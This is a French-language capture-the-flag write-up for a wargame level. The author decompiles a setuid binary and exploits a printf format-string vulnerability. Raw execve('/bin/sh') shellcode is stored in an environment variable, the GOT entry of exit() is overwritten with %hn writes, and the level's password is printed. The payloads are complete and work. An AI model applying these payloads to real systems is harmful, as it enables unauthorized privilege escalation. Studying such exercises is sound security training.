Je commence par analyser mon environnement :

```bash
$ id && pwd && ls -la
uid=1005(level05) gid=1005(level05) groups=1005(level05),100(users)
/home/users/level05
total 17
dr-xr-x---+ 1 level05 level05   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level05 level05  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level05 level05 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level06 users   5176 Sep 10  2016 level05
-rw-r--r--+ 1 level05 level05   41 Oct 19  2016 .pass
-rw-r--r--  1 level05 level05  675 Sep 10  2016 .profile
```

Je trouve un binaire `level05`, que je tente d'éxecuter :

```bash
$ ./level05
da
da
```

Je décompile le binaire avec [Dogbolt](https://dogbolt.org/?id=061a1527-1288-4c44-8fe6-bc482323508f#Hex-Rays=116&Boomerang=19) :

```c
int main(int argc, const char **argv)
{
  char buffer[100]; 
  unsigned int i;

  i = 0;
  fgets(buffer, 100, stdin);

  for ( i = 0; i < strlen(buffer); ++i )
  {
    if ( buffer[i] > 64 && buffer[i] <= 90 )
      buffer[i] ^= 32; // <---------------------3 shellcode will be stored in an env variable because some of its bytes gets caught here and changed
  }
  
  printf(buffer); // <--------------------------1 format string vulnerability, arbitrary code can be ran here since printf uses user input and no args
  exit(0); // <---------------------------------2 Ret2Plt exploit used with printf, rewrites what the PLT for exit() redirects to shellcode
}
```

Note :
- Le `if` vérifie si le caractère est supérieur à `@` (64 en ASCII) et inférieur à `Z`
- Si c'est le cas, le caractère est donc en majuscule
- Il subit une opération XOR de 32, ce qui revient à le rendre minuscule

Il s'agirait ici d'exploiter la `format string vulnerability` de `printf`. Ce n'est cependant pas aussi simple que dans les level précédent, puisqu'il n'y a pas de valeur à lire, mais il faut exécuter du code arbitraire à partir de cet exploit.

Je vais utiliser une méthode similaire à celle que j'ai utilisé dans le projet `Rainfall`, c'est un exploit du nom de `Ret2plt`.

Cet exploit implique de ré-écrire l'adresse `GOT` de la fonction `exit()` (car c'est celle qui suit le `printf()` dans notre binaire). 

L'adresse `GOT` pointe sur le "code source" de la fonction `exit()`. Avant d'atteinte `exit()` au runtime, `exit()` à une adresse `PLT`. Le processus de "dynamic linking" fait matcher cette adresse `PLT` a une adresse sur `GOT`, et permet donc à `exit()` de pointer sur sa fonction dans la `libc` (plus d'information [ici](https://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got) et [ici](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)).

On peut observer ce comportement en analysant `exit()` avec `gdb`, mais sans `run` le binaire :

```h
$ gdb ./level05 -q
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.

(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
```

On voit que `exit()` est référencé tel que `exit@plt` et que sa première instruction pointe sur une autre adresse (celle `GOT`, où se trouve le "vrai" code d'`exit()`).

Il me faut donc tenter d'utiliser le `shellcode` du level précédent ([source](https://shell-storm.org/shellcode/files/shellcode-827.html)), de l'insérer dans le buffer, et de ré-écrire ce vers quoi pointe `exit()`, soit, le début de notre shellcode suivant :

```bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

Qui représente un appel à `execve("/bin/sh")`. 

Comme dans `Rainfall`, pour construire ce payload infecté, je dois trouver quelle est la position de mon input dans la stack, car, sans argument, `printf()` va lire la stack si je lui demande d'imprimer des valeurs hexadécimal avec `%x` :

```bash
$ python -c 'print("AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x")' | ./level05
aaaa 64 f7fcfac0 0 0 0 0 ffffffff ffffd774 f7fdb000 61616161 20782520 25207825 78252078 20782520
                                                     ^
$ python -c 'print("AAAB %x %x %x %x %x %x %x %x %x %x %x %x %x %x")' | ./level0
5
aaab 64 f7fcfac0 0 0 0 0 ffffffff ffffd774 f7fdb000 62616161 20782520 25207825 78252078 20782520
                                                     ^
```

Je trouve que mon input représente le 10ème argument sur la stack.

En réfléchissant à la construction du payload, je me rend compte que certains bytes de mon shellcode vont être affecté par l'opération `XOR`. Notamment le 3eime byte de mon shellcode : `\x50` (qui converti en décimal, puis en ASCII, représente P).

Je ne peux donc pas insérer mon shellcode directement dans le buffer. Je cherche une solution alternative. [Ce site](https://bista.sites.dmi.unipg.it/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x270-stackoverflow.html) me met sur la piste d'une injection à partir d'une variable environnement. En effet, l'environnement est accessible depuis le binaire, donc il a une adresse en mémoire.

Je commence par stocker mon shellcode dans une variable env :

```h
$ export SHELLCODE=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
```

Puis cherche l'adresse de cette variable dans la mémoire du binaire avec `gdb` :

```h
$ gdb ./level05 -q
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) r
Starting program: /home/users/level05/level05

Breakpoint 1, 0x08048449 in main ()
(gdb) x/1000s environ
...
0xffffd8d3:      "SHELLCODE=1\300Ph//shh/bin\211\343PS\211\341\260\v̀"
...
```

En essayant le payload avec cette adresse, et sans succès, je me rend compte que l'adresse transformée en décimale est bien trop grande pour être contenu dans un int : `0xffffd8d3 => 4294957267` :

```bash
$ (python -c 'print("\x08\x04\x97\xe0"[::-1] + "%4294957263x %10$n")'; cat) | ./level05
whoami
$
```

Je dois donc [séparer](https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html) en utilisant le formatteur `%hn` de printf, qui permet d'écrire dans 2 bytes à la fois, d'abord 2 dans l'adresse d'origine de `exit()` trouvée plus haut, puis 2 bytes plus loin.

Les adresses à écrire seront donc `0xffff` et `0xd8d3` soit 65535 et 55507.
Il faut aussi prendre en compte que l'adresse sera en Small Endian, j'écrirais donc d'abord 55507 bytes, puis (65535 - 55507 = 10028) bytes puisque 55507 bytes auront déjà été écrit.

Mon nouveau payload sera donc :

```python
python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55507x%10$hn" + "%10028x%11$hn")'
```

Je l'essaye :

```bash
$ (python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55507x%10$hn" + "%10028x%11$hn")'; cat) | ./level05
whoami
Segmentation fault (core dumped)
$
```

Sans succès également, et après relecture de la source sur la séparation, je réalise qu'il me faut soustraire 8 bytes pour les 2 adresses d'exit écrite auparavant, je soustrais donc 8 à 55507 et obtiens 55499.

Je retente :

```bash
$ (python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55499x%10$hn" + "%10028x%11$hn")'; cat) | ./level05
whoami
Segmentation fault (core dumped)
$
```

Cela ne marche toujours pas, alors je ré-inspecte ma solution.

Je me rends compte que l'adresse que je passe :

```h
0xffffd8d3:      "SHELLCODE=1\300Ph//shh/bin\211\343PS\211\341\260\v̀"
```

Inclus la partie "SHELLCODE" :

```h
(gdb) x/100bx 0xffffd8d3
0xffffd8d3:     0x53    0x48    0x45    0x4c    0x4c    0x43    0x4f    0x44
0xffffd8db:     0x45    0x3d    0x31    0xc0    0x50    0x68    0x2f    0x2f
0xffffd8e3:     0x73    0x68    0x68    0x2f    0x62    0x69    0x6e    0x89
0xffffd8eb:     0xe3    0x50    0x53    0x89    0xe1    0xb0    0x0b    0xcd
0xffffd8f3:     0x80    0x00    0x54    0x45    0x52    0x4d    0x3d    0x78
0xffffd8fb:     0x74    0x65    0x72    0x6d    0x2d    0x32    0x35    0x36
0xffffd903:     0x63    0x6f    0x6c    0x6f    0x72    0x00    0x53    0x48
0xffffd90b:     0x45    0x4c    0x4c    0x3d    0x2f    0x62    0x69    0x6e
0xffffd913:     0x2f    0x62    0x61    0x73    0x68    0x00    0x53    0x53
0xffffd91b:     0x48    0x5f    0x43    0x4c    0x49    0x45    0x4e    0x54
0xffffd923:     0x3d    0x31    0x30    0x2e    0x30    0x2e    0x32    0x2e
0xffffd92b:     0x32    0x20    0x34    0x39    0x32    0x35    0x33    0x20
0xffffd933:     0x34    0x32    0x34    0x32
```

0x53 = 82 = S
0x48 = 72 = H
etc...

Pour obtenir une adresse qui pointe sur le début du shellcode... et bien il faut que le nom de ma variable environnement fasse 7 caractère, pour, qu'avec le =, l'adresse suivante commence à pointer sur le shellcode.

Je modifie la variable :

```bash
$ export PAYLOAD=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
```

Puis la trouve sa nouvelle adresse dans `gdb` :

```h
...
0xffffdf9a:      "PAYLOAD=1\300Ph//shh/bin\211\343PS\211\341\260\v̀"
...

(gdb) x/100bx 0xffffdf9a
0xffffdf9a:     0x50    0x41    0x59    0x4c    0x4f    0x41    0x44    0x3d
0xffffdfa2:     0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68 <---- cette adresse
0xffffdfaa:     0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
0xffffdfb2:     0x53    0x89    0xe1    0xb0    0x0b    0xcd    0x80    0x00
0xffffdfba:     0x4c    0x45    0x53    0x53    0x43    0x4c    0x4f    0x53
0xffffdfc2:     0x45    0x3d    0x2f    0x75    0x73    0x72    0x2f    0x62
0xffffdfca:     0x69    0x6e    0x2f    0x6c    0x65    0x73    0x73    0x70
0xffffdfd2:     0x69    0x70    0x65    0x20    0x25    0x73    0x20    0x25
0xffffdfda:     0x73    0x00    0x2f    0x68    0x6f    0x6d    0x65    0x2f
0xffffdfe2:     0x75    0x73    0x65    0x72    0x73    0x2f    0x6c    0x65
0xffffdfea:     0x76    0x65    0x6c    0x30    0x35    0x2f    0x6c    0x65
0xffffdff2:     0x76    0x65    0x6c    0x30    0x35    0x00    0x00    0x00
0xffffdffa:     0x00    0x00    0x00    0x00
```

Je refais tout les calcul précédamment effectué sur la nouvelle adresse et construit le payload à partir de ces nouvelles informations :

```bash
$ (python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%57242x%10$hn" + "%8285x%11$hn")'; cat) | ./level05
whoami
Segmentation fault (core dumped)
$
```

Grrrr, sans succès, j'analyse à nouveau les potentiels problèmes.

Je me rappelle dans `Rainfall` avoir dû besoin de faire des `NOP sled`, ce qui revient à une instruction "nulle" mais qui peut aider à aligner la mémoire, j'en ajoute donc devant mon payload :

```h
export PAYLOAD=$'\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
```

Et le ré-essaye :

```bash
$ (python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%57242x%10$hn" + "%8285x%11$hn")'; cat) | ./level05
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
^C
```

ENFIN !